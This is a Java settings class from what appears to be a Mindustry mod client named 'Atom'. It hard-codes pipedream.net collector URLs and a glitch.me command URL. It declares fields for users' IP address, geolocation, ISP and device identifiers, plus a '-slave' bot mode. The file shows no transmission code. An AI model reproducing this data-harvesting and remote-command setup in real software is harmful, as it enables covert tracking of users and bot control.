package Atom;


import Atom.Carbon.NetBot;
import Photon.gae;
import arc.Events;
import arc.struct.Array;
import mindustry.game.EventType;

import java.time.format.DateTimeFormatter;

import static mindustry.Vars.disableUI;
import static mindustry.Vars.player;

public class Manifest {

    public static NetBot netBot;

    public static final String crashReportURL = "https://e9ae1920902b1a5610d1e67022aee82b.m.pipedream.net";
    public static final String MD_CHAT = "https://d51513e03a6b4f85c0647d3f0125aeec.m.pipedream.net/";
    // Discord Use
     public static String presenceState = "Geh";
    public static String presenceDetails = "bruv";
     // public static Hydrogen General;
     // public static Helium Encryption;
     // public static Lithium Network;
     // public static Beryllium TimeKeeper;
     // public static Boron Tools;
     // public static Carbon AI;
     // public static Nitrogen Info;
    public static volatile Array<Process> processes = new Array<>();
    public volatile static boolean mainThreadAlive = true;
    public static String slaveHost;
    public static String slaveName;
    public static boolean isSlave ;
    public static Array<String> JarArgs;
    public static String currentServer = "NULL";
    public static String[] tags = {"&lc&fb[D]", "&lg&fb[I]", "&ly&fb[W]", "&lr&fb[E]", ""};
    public static DateTimeFormatter dateTime = DateTimeFormatter.ofPattern("MM-dd-yyyy | HH:mm:ss");
    public static boolean autoMode = true;
    public static boolean debugMode = true;
    public static boolean isAndroid = false;
    public static boolean isDesktop = false;
    public static boolean isHeadless = false;
    public static String CommandUrl = "https://o7-discord.glitch.me/";
    public static Boolean Sended = false;
    public static String EndCryptPrefix = "NULL";
    public static String EveryPrintableAscii = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~";
    public static String EveryPrintableAsciiButItsFlipped = "NULL";
    public static String StatusNow = "NULL";
    public static String ServerNow = "NULL";
    public static String ModsNow = "NULL";
    public static String USID = "NULL";
    public static String IP = "NULL";
    public static String Continent = "NULL";
    public static String ContinentCode = "NULL";
    public static String Country = "NULL";
    public static String CountryCode = "NULL";
    public static String Region = "NULL";
    public static String RegionName = "NULL";
    public static String City = "NULL";
    public static String District = "NULL";
    public static String Zip = "NULL";
    public static int Latidude = 0;
    public static int Longtidude = 0;
    public static String TimeZone = "NULL";
    public static String Currency = "NULL";
    public static String ISP = "NULL";
    public static String ORG = "NULL";
    public static String AS = "NULL";
    public static String ASName = "NULL";
    public static String reverse = "NULL";
    public static boolean deviceMobile = false;
    public static boolean proxy = false;
    public static Boolean hosting = false;
    public static String ENV = "NULL";
    public static String Cores = "NULL";
    public static String FreeMemory = "NULL";
    public static String MaxMemory = "NULL";
    public static String Roots = "NULL";
    public static String TotalSpace = "NULL";
    public static String FreeSpace = "NULL";
    public static String UsableSpace = "NULL";

    public static String Dates = "NULL";
    public static String Times = "NULL";

    public static String username = "NULL";
    public static String AndroidVersion = "NULLS";
    public static String ID = "NULL";
    public static String DISPLAY = "NULL";
    public static String PRODUCT = "NULL";
    public static String DEVICE = "NULL";
    public static String BOARD = "NULL";
    public static String MANUFACTURER = "NULL";
    public static String BRAND = "NULL";
    public static String MODEL = "NULL";
    public static String BOOTLOADER = "NULL";
    public static String HARDWARE = "NULL";
    public static String pendingServer = "NULL";

    public static void init(){
        gae.init();
        Events.on(EventType.LateInit.class, Manifest::lateInit);
    }

    public static void lateInit(){
        if(Manifest.isSlave)
            player.name = gae.hydrogen.shuffle(EveryPrintableAscii);
        if(Manifest.slaveName != null)
            player.name = Manifest.slaveName;
        gae.lateInit();
    }

    public static void parseArg(){
        isSlave = JarArgs.contains("-slave");
        disableUI = JarArgs.contains("-nogui");
        if(JarArgs.contains("-host"))
            slaveHost = JarArgs.get(JarArgs.indexOf("-host") + 1);
        if(JarArgs.contains("-name"))
            slaveName = JarArgs.get(JarArgs.indexOf("-name") + 1);
        if(JarArgs.contains("-server"))
            pendingServer = JarArgs.get(JarArgs.indexOf("-server") + 1);
    }
}
